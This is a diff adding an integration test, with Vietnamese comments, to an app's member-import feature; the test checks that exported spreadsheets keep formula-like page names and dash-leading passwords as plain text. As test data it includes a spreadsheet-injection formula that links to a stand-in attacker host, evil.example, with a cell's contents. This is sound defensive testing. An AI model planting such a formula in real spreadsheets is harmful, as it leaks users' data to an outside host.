@@ -22,6 +22,7 @@ from app.models import (
     Workspace,
     WorkspaceMember,
 )
+from app.services import import_service
 from tests.integration import factories as f
 
 pytestmark = pytest.mark.integration
@@ -71,6 +72,32 @@ async def test_template_lists_tracked_pages(as_role: Any, p4: str) -> None:
     assert [c.value for c in wb["Nhan vien"][1]] == HEADER
     pages = {row[1] for row in wb["Trang"].iter_rows(min_row=2, values_only=True)}
     assert {"[P1]", "[P2]", "[P3]", "[P4]"} <= pages
+
+
+async def test_template_and_credentials_are_plain_text(
+    as_role: Any, admin_db: AsyncSession, org: Any, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Mục O: tên Trang dạng công thức và mật khẩu bắt đầu bằng '-' giữ nguyên là chữ."""
+    ws = await admin_db.get(Workspace, org.accounts["owner"].workspace.id)
+    assert ws is not None
+    formula = '=HYPERLINK("https://evil.example?"&A1,"Mở")'
+    await f.create_page(admin_db, ws, name=formula)
+    await admin_db.commit()
+    manager = await as_role("manager")
+    template = load_workbook(
+        io.BytesIO((await manager.get("/api/imports/members/template")).content)
+    )
+    cell = next(
+        c for row in template["Trang"].iter_rows(min_row=2) for c in row if c.value == formula
+    )
+    assert cell.data_type == "s"
+
+    monkeypatch.setattr(import_service, "_temp_password", lambda: "-Ab3_x9kQ-Tm")
+    body = (await _preview(manager, xlsx([["[NV mới]", "moi2@example.com", "", "", ""]]))).json()
+    result = (await manager.post(f"/api/imports/{body['id']}/apply")).json()
+    creds = load_workbook(io.BytesIO(base64.b64decode(result["credentials_file"])))
+    rows = list(creds.active.iter_rows(min_row=2, values_only=True))  # type: ignore[union-attr]
+    assert rows == [("[NV mới]", "moi2@example.com", "-Ab3_x9kQ-Tm")]
 
 
 async def test_preview_then_apply(
